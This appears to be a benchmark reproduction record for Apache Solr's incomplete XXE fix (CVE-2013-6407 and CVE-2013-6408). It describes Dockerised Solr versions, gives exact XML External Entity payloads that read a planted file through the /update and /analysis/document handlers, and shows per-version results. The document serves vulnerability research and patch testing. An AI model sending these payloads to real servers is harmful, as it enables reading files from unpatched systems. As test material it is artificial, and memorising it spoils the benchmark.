=== PatchClosure-Bench repro: apache-solr-cve-2013-6408  (REAL SERVER / EXTERNAL HTTP) ===
Pair: CVE-2013-6407 (XXE in XML UpdateRequestHandler / XMLLoader)  ->  CVE-2013-6408 (XXE in DocumentAnalysisRequestHandler)
Root cause: XML External Entity injection (CWE-611). Genuine INCOMPLETE FIX (NVD-confirmed).
Rebuilt 2026-07-16 per HARD POLICY: the previous build triggered the library IN-PROCESS
(compose exec of a reflection Driver) -- BANNED. This build boots a REAL running Apache Solr
server per version and triggers the XXE by an EXTERNAL HTTP POST of malicious XML to the real
request handlers. run_mode = real-server-http.

RELATIONSHIP (authoritative):
  - NVD CVE-2013-6408: "The DocumentAnalysisRequestHandler in Apache Solr before 4.3.1 does not
    properly use the EmptyEntityResolver ... NOTE: this vulnerability exists because of an
    incomplete fix for CVE-2013-6407."
  - Apache SOLR-4881: "Fix DocumentAnalysisRequestHandler to correctly use EmptyEntityResolver to
    prevent loading of external entities like UpdateRequestHandler does" -- "this was overlooked
    while committing SOLR-3895 [= CVE-2013-6407]."
  Same sink CLASS (a Solr handler's XMLInputFactory StAX parse); same guard (EmptyEntityResolver.
  configureXMLInputFactory); different handler; NOT same-release (6407 fixed 4.1.0, 6408 fixed 4.3.1).

REAL SERVER (recipe-only, NO vendored dist committed):
  Dockerfile (eclipse-temurin:8-jdk) downloads the EXACT published Apache Solr binary distribution
  from archive.apache.org at build time and boots the bundled Jetty + example collection1 core:
    V0 = archive.apache.org/dist/lucene/solr/4.0.0/apache-solr-4.0.0.tgz  -> port 18980
    V1 = archive.apache.org/dist/lucene/solr/4.1.0/solr-4.1.0.tgz         -> port 18981  [TARGET]
    V2 = archive.apache.org/dist/lucene/solr/4.3.1/solr-4.3.1.tgz         -> port 18982
  entrypoint.sh plants ${PCB_FLAG} at /flag (OUTSIDE the app dir) then `java -jar start.jar`.
  The stock example solrconfig.xml registers BOTH request handlers used here:
    /update              -> solr.UpdateRequestHandler  (parsed by XMLLoader)          [CVE-2013-6407 sink]
    /analysis/document   -> solr.DocumentAnalysisRequestHandler                        [CVE-2013-6408 sink]
  The oracle (oracle.py) is a plain HTTP client (urllib) -- it POSTs the XXE XML to the published
  port. NOTHING runs in-process; the vulnerable path is the server's own unmodified handler.

EXACT XXE DOCUMENTS (crafted empirically against the real handlers):
  original (CVE-2013-6407) -> POST http://127.0.0.1:<port>/solr/collection1/update?commit=true
    <?xml version="1.0"?>
    <!DOCTYPE add [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <add><doc><field name="id">pcb-xxe</field><field name="pcb_i">&xxe;</field></doc></add>
    (pcb_i is a dynamic int field `*_i`; the resolved file text is fed to Integer parsing and
     REFLECTED verbatim in the 400 error: msg=For input string: "<flag>\n".)
  residual (CVE-2013-6408) -> POST http://127.0.0.1:<port>/solr/collection1/analysis/document
    <?xml version="1.0"?>
    <!DOCTYPE docs [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <docs><doc><field name="id">&xxe;</field></doc></docs>
    (id is the string uniqueKey; the analysis handler echoes the un-tokenized value = the flag.)

OBSERVED (external HTTP, real Docker, JDK 8):
              original (/update / XMLLoader)             residual (/analysis/document / DocAnalysis)
  V0 4.0.0    REACHES  (flag in int-parse error msg)      (reaches)
  V1 4.1.0    BLOCKED  (msg=For input string: "")          REACHES  (flag in field analysis)   <- incomplete fix
  V2 4.3.1    (blocked)                                     BLOCKED  (empty analysis)

